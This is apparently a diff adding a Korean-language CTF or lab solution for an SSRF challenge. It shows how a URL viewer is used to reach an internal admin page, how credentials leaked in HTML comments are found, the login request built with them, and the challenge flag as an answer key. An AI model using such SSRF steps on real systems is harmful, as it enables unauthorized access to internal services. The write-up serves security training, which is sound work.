@@ -1,0 +1,28 @@
+===========================
+SSRF 3번
+===========================
+
+1. 공격 과정
+  1) URL 뷰어 기능에서 사용자가 입력한 URL을 서버가 대신 요청하는 것을 확인
+     /ssrf_3/urlviewer.php?url=https://www.daum.net
+
+  2) URL 뷰어 페이지의 응답 HTML을 확인하던 중 주석으로 관리자 페이지 주소가 노출되어 있는 것을 확인
+     <!-- 관리자페이지 : http://eqst-ssrf-victim.com:8098/admin.php -->
+
+  3) 관리자 페이지 주소를 URL 뷰어에 입력하여 내부 관리자 페이지에 접근
+     http://eqst-ssrf-victim.com:8098/admin.php
+
+  4) 응답 HTML 주석에서 임시 관리자 계정 정보를 확인
+     ID: adminID
+     PW: adminPW
+
+  5) 관리자 페이지에 로그인 파라미터를 포함해 요청했
+     http://eqst-ssrf-victim.com:8098/admin.php?login_id=adminID&login_pwd=adminPW
+
+  6) 로그인에 성공
+
+2. 정답
+
+i_can_not_stop_you
+
+============================
